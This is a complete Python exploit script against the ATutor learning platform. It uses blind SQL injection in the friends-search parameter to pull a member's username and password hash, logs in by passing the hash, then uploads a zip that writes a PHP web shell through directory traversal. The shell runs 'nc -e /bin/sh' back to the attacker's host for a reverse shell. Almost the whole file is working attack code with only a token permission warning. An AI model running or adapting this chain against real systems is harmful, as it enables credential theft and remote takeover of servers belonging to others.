#!/usr/bin/env python3

# Exploit Title: SQLi to RCE using pass the hash and file upload directory traversal
# Date: 2021-02-22
# Exploit Author: 0xAlmighty
# Blog: http://0xalmighty.github.io
# GitHub: https://github.com/0xalmighty
# Twitter: https://twitter.com/0xalmighty
# Email: MHhhbG1pZ2h0eUBwcm90b25tYWlsLmNvbQ==
# Exploit the SQLi in the SearchFriends param, retrieve the hash and encode it to login in the victim account.
# When logged in, it upload a zip file to exploit the file upload directory traversal RCE
# Test only if you're authorized, be smart.                 
# Just start a netcat listener to receive the shell eg: nc vnlp 80
# Example usage: python3 pawnatutor.py -target DOMAIN/IP -rhost YOUR IP -rport YOUR PORT

import requests
import warnings
import sys
import argparse
import colorama
import time
import hashlib
import zipfile
from io import BytesIO

# Cool banner
banner = '''\033[1;32m
 ██████╗   █████╗  ██╗    ██╗ ███╗   ██╗  █████╗  ████████╗ ██╗   ██╗ ████████╗  ██████╗  ██████╗
 ██╔══██╗ ██╔══██╗ ██║    ██║ ████╗  ██║ ██╔══██╗ ╚══██╔══╝ ██║   ██║ ╚══██╔══╝ ██╔═══██╗ ██╔══██╗
 ██████╔╝ ███████║ ██║ █╗ ██║ ██╔██╗ ██║ ███████║    ██║    ██║   ██║    ██║    ██║   ██║ ██████╔╝
 ██╔═══╝  ██╔══██║ ██║███╗██║ ██║╚██╗██║ ██╔══██║    ██║    ██║   ██║    ██║    ██║   ██║ ██╔══██╗
 ██║      ██║  ██║ ╚███╔███╔╝ ██║ ╚████║ ██║  ██║    ██║    ╚██████╔╝    ██║    ╚██████╔╝ ██║  ██║
 ╚═╝      ╚═╝  ╚═╝  ╚══╝╚══╝  ╚═╝  ╚═══╝ ╚═╝  ╚═╝    ╚═╝     ╚═════╝     ╚═╝     ╚═════╝  ╚═╝  ╚═╝
\t\033[1;37mTwitter @0xalmighty\t\t\t\t\033[1;37mᴵⁿᵛᶦˢᶦᵇˡᵉ ᵗʰᶦⁿᵍˢ ᵃʳᵉ ᵗʰᵉ ᵒⁿˡʸ ʳᵉᵃˡᶦᵗᶦᵉˢ
'''

# Do the SQLi and get the hash and username of victim
def searchFriends_sqli(ip, inj_str):
    for j in range(32, 126):
        target = "http://%s/ATutor/mods/_standard/social/index_public.php?search_friends=%s" % (ip, inj_str.replace("[CHAR]", str(j)))
        r = requests.get(target, verify=False)
        content_length = int(r.headers['Content-Length'])
        if (content_length > 6170):    
            return j
    return None

def exploit(ip):
    print (f'\033[1;31m(+) Retrieving username information...\033[0m')
    print (f'\033[1;31m(+) Writing the result in a file named username.txt\033[0m')
    usern = open("username.txt", "w")
    for i in range(1,8):
        injection_string = "0x')/**/or/**/(ascii(substring((select/**/login/**/from/**/AT_members),%d,1)))=[CHAR]%%23" % i
        extracted_char1 = chr(searchFriends_sqli(ip, injection_string))
        user = (extracted_char1)
        usern.write(user)
        sys.stdout.write("\033[1;33m" + extracted_char1)
        sys.stdout.flush()
    usern.close()
    print (f'\033[1;32m\n(+) done!\033[0m')

    print (f'\033[1;31m(+) Retrieving password information...\033[0m')

    userhash = open("hash.txt", "w")
    print (f'\033[1;31m(+) Writing the result in a file named hash.txt\033[0m')
    for i in range(1,41):
        injection_string = "0x')/**/or/**/(ascii(substring((select/**/password/**/from/**/AT_members),%d,1)))=[CHAR]%%23" % i
        extracted_char2 = chr(searchFriends_sqli(ip, injection_string))
        hash = (extracted_char2)
        userhash.write(hash)
        sys.stdout.write("\033[1;33m" + extracted_char2)
        sys.stdout.flush()
    userhash.close()
    print (f'\033[1;32m\n(+) done!\033[0m')

# Encode the hash, login to aututor account and upload the shell
def login(ip, rhost, rport):
    print (f'\033[1;31m[+] Encoding the hash in SHA1 and concatening new hash with the random token...\033[0m')
    target1 = "http://%s/ATutor/login.php" % (ip)
    token = "almightygod"
    with open("hash.txt") as f1, open("username.txt") as f2:
        line_hash = f1.readline()
        line_username = f2.readline()
        print (f"\033[1;31m[+] Here's the SHA1 password encoded twice and concataned with the token...\033[0m")
        h = hashlib.sha1((line_hash + token).encode('utf-8'))
        print ("\033[1;33m" + h.hexdigest())
        hashed = h.hexdigest()
        print (f"\033[1;31m[+] login to this account:\033[0m")
        print ("\033[1;33m" + line_username)
    d = {
        "form_password_hidden" : hashed,
        "form_login": line_username,
        "submit": "Login",
        "token" : token
    }
    headers = {
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0",
        "Referer": "http://atutor/ATutor/login.php",
    }
    s = requests.Session()
    print (f"\033[1;31m[+] Attempting to login to Atutor account, please wait...\033[0m")
    time.sleep(2)
    r = s.post(target1, headers=headers, data=d, verify=False)
    res = r.text
    if "Create Course: My Start Page" in res or "My Courses: My Start Page" in res:
        print (f'\033[1;32m[+] Login successful!\033[0m')
    else:
        print (f'\033[1;31m[+] Unable to login!\033[0m')

    # Building the zip file
    print (f'\033[1;31m[+] Building the zip file with the malicious file...\033[0m')
    f = BytesIO()
    z = zipfile.ZipFile(f, 'w', zipfile.ZIP_DEFLATED)
    z.writestr('../../../../../../../../../var/www/html/ATutor/mods/almightyevil/evil.phtml', f'<?php shell_exec("nc -e /bin/sh {rhost} {rport}") ?>')
    z.writestr('imsmanifest.xml', 'bombaklaat')
    z.close()
    zip = open('evil.zip', 'wb')
    zip.write(f.getvalue())
    zip.close()
    print (f'\033[1;32m[+] zip file successfully created!\033[0m')

    # Sending the zip file
    print (f"\033[1;31m[+] Sending the zip file to the target...\033[0m")
    target2 = "http://atutor/ATutor/mods/_standard/tests/question_import.php?h=" #%s (ip)
    headers = {
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate",
    "Referer": "http://atutor/ATutor/mods/_standard/tests/index.php",
    "Connection": "close",
    "Origin": "http://atutor",
    "Upgrade-Insecure-Requests": "1"
    }
    file = [
        ('file', ('evil.zip', open("evil.zip", "rb"), 'application/zip')),
        ('submit_import', (None, 'Import'))
        ]
    s.cookies
    r = s.post(target2, headers=headers, verify=False, files = file)
    res = r.text
    if "XML error:" in res or "Not well-formed (invalid token) at line 1" in res:
        print (f'\033[1;32m[+] Upload completed successfully!\033[0m')
    else:
        print (f'\033[1;31m[+]Something went wrong!\033[0m')

# Browse to the path to trigger the shell
def get_shell(ip):
    print (f"\033[1;31m[+] Triggering the shell, please wait...\033[0m")
    print (f'\033[1;32m[+] Enjoy your shell young padawan!\033[0m')
    final_url = "http://%s/ATutor/mods/almightyevil/evil.phtml" % (ip)
    r = requests.get(final_url, verify=False)
    time.sleep(2)

# Instruction
if __name__ == '__main__':

    requests.packages.urllib3.disable_warnings()

    from argparse import ArgumentParser
    parser = ArgumentParser(description='\033[1;31mNeed help?')
    parser.add_argument('-target', help='Domain or IP')
    parser.add_argument('-rhost', help='IP for the reverse shell')
    parser.add_argument('-rport', help='Port for the reverse shell')

    args = parser.parse_args()

    if args.target:
        ip = exploit(args.target)
        ip = login(args.target, args.rhost, args.rport)
        ip = get_shell(args.target)

    if len(sys.argv) < 2:
        print(f'{banner}\n')
        print(f'\t\033[93mThis is a Atutor crusher, use it if you have permission only!\n')
        print(f'\t\033[1;31mUsage:\033[1;37m python3 {sys.argv[0]} -target domain/IP -rhost YOUR IP -rport YOUR PORT\n')
        print(f'\t\033[1;31mNeed help?\n')
        print(f'\t\033[1;31mTry: \033[1;37mpython3 pwnatutor.py --help\n')
        sys.exit(0)
